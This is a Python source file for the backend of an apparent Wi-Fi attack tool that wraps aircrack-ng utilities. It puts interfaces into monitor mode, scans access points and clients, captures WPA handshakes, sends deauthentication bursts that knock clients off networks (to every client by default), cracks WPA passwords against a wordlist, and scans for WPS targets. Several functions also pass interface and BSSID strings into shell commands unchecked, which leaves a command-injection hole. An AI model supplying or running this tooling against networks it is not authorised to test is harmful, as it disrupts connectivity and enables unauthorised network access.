import subprocess
import os
import csv
import time
import signal
import threading

class PentestBackend:
    def __init__(self):
        self.active_processes = {}
        # Ensure tmp dir exists for our scans
        if not os.path.exists("/tmp/wifiaudit"):
            os.makedirs("/tmp/wifiaudit", exist_ok=True)

    def get_interfaces(self):
        """Returns a list of available wireless interfaces."""
        try:
            # simple way: list /sys/class/net and check for wireless folder
            interfaces = []
            for i in os.listdir('/sys/class/net/'):
                if os.path.exists(f'/sys/class/net/{i}/wireless'):
                    interfaces.append(i)
            return interfaces
        except Exception as e:
            return []

    def run_cmd(self, cmd):
        """Runs a blocking command and returns output."""
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return res.stdout
        except Exception as e:
            return str(e)

    def start_monitor(self, interface):
        """Enables monitor mode via airmon-ng."""
        self.run_cmd(f"airmon-ng check kill")
        out = self.run_cmd(f"airmon-ng start {interface}")
        # Identify new interface name (e.g. wlan0mon)
        for line in out.split('\n'):
            if "monitor mode vif enabled for" in line or "mac80211 monitor mode vif enabled for" in line:
                parts = line.split()
                return parts[-1].strip("][")
        
        # Fallback check
        interfaces = self.get_interfaces()
        if f"{interface}mon" in interfaces:
            return f"{interface}mon"
        return interface

    def stop_monitor(self, interface):
        """Disables monitor mode."""
        self.run_cmd(f"airmon-ng stop {interface}")
        self.run_cmd("systemctl restart NetworkManager")

    def _kill_process(self, name):
        if name in self.active_processes:
            p = self.active_processes[name]
            try:
                os.kill(p.pid, signal.SIGTERM)
                p.wait(timeout=2)
            except:
                try:
                    os.kill(p.pid, signal.SIGKILL)
                except:
                    pass
            del self.active_processes[name]

    # ================= WPA SCANNING (Airodump-ng) =================

    def start_wpa_scan(self, interface):
        self._kill_process("airodump")
        # Cleanup old files
        self.run_cmd("rm -f /tmp/wifiaudit/wpascan*")
        
        cmd = ["airodump-ng", interface, "-w", "/tmp/wifiaudit/wpascan", "--output-format", "csv", "--write-interval", "1"]
        self.active_processes["airodump"] = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop_wpa_scan(self):
        self._kill_process("airodump")

    def parse_wpa_scan(self):
        """Parses the airodump-ng CSV file and returns APs and Clients."""
        csv_path = "/tmp/wifiaudit/wpascan-01.csv"
        if not os.path.exists(csv_path):
            return [], []

        aps = []
        clients = []
        parsing_clients = False

        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('\r') or line.startswith('\n'):
                        continue
                    if "Station MAC" in line:
                        parsing_clients = True
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    if not parsing_clients:
                        if len(parts) >= 14 and parts[0] != "BSSID":
                            # BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
                            bssid = parts[0]
                            channel = parts[3]
                            power = parts[8]
                            privacy = parts[5]
                            essid = parts[13] if len(parts) > 13 else ""
                            if bssid:
                                aps.append({"BSSID": bssid, "Channel": channel, "Power": power, "Privacy": privacy, "ESSID": essid})
                    else:
                        if len(parts) >= 6 and parts[0] != "Station MAC":
                            # Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
                            client_mac = parts[0]
                            bssid = parts[5]
                            power = parts[3]
                            if client_mac and bssid and bssid != "(not associated)":
                                clients.append({"ClientMAC": client_mac, "BSSID": bssid, "Power": power})
        except Exception:
            pass

        return aps, clients

    # ================= WPA CAPTURE & DEAUTH =================

    def start_handshake_capture(self, interface, bssid, channel):
        self._kill_process("airodump")
        self.run_cmd("rm -f /tmp/wifiaudit/capture*")
        
        # Airodump targeting specific AP and saving standard pcap
        cmd = ["airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", "/tmp/wifiaudit/capture", interface]
        self.active_processes["airodump"] = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def check_handshake_captured(self):
        """Uses aircrack-ng to check if a handshake exists in the cap file."""
        cap_file = "/tmp/wifiaudit/capture-01.cap"
        if not os.path.exists(cap_file):
            return False
        out = self.run_cmd(f"aircrack-ng {cap_file}")
        return "1 handshake" in out.lower() or "wpa (1 handshake" in out.lower()

    def send_deauth(self, interface, bssid, client_mac="FF:FF:FF:FF:FF:FF"):
        """Sends a burst of deauth packets."""
        # Runaireplay-ng synchronously for a quick burst
        if client_mac == "FF:FF:FF:FF:FF:FF":
             cmd = f"aireplay-ng -0 5 -a {bssid} {interface}"
        else:
             cmd = f"aireplay-ng -0 5 -a {bssid} -c {client_mac} {interface}"
        
        # Run in a background thread so it doesn't freeze the GUI
        threading.Thread(target=self.run_cmd, args=(cmd,)).start()

    # ================= CRACKING =================

    def crack_wpa(self, cap_file, wordlist_path):
        """Starts aircrack-ng and returns the subprocess object so we can read stdout."""
        cmd = ["aircrack-ng", "-w", wordlist_path, cap_file]
        return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)

    # ================= WPS SCANNING (Wash) =================

    def start_wps_scan(self, interface):
        self._kill_process("wash")
        self.run_cmd("rm -f /tmp/wifiaudit/washscan.txt")
        # wash needs to be run and piped to a file
        cmd = f"wash -i {interface} > /tmp/wifiaudit/washscan.txt"
        self.active_processes["wash"] = subprocess.Popen(cmd, shell=True)

    def stop_wps_scan(self):
        self._kill_process("wash")

    def parse_wps_scan(self):
        file_path = "/tmp/wifiaudit/washscan.txt"
        if not os.path.exists(file_path):
            return []
        
        wps_aps = []
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()
                started = False
                for line in lines:
                    line = line.strip()
                    if line.startswith("---"):
                        started = True
                        continue
                    if started and line:
                        parts = line.split()
                        if len(parts) >= 5:
                            bssid = parts[0]
                            channel = parts[1]
                            rssi = parts[2]
                            wps_ver = parts[3]
                            locked = parts[4]
                            essid = " ".join(parts[5:]) if len(parts) > 5 else ""
                            wps_aps.append({
                                "BSSID": bssid, "Channel": channel, 
                                "RSSI": rssi, "WPS_Ver": wps_ver, 
                                "Locked": locked, "ESSID": essid
                            })
        except Exception:
            pass
        return wps_aps
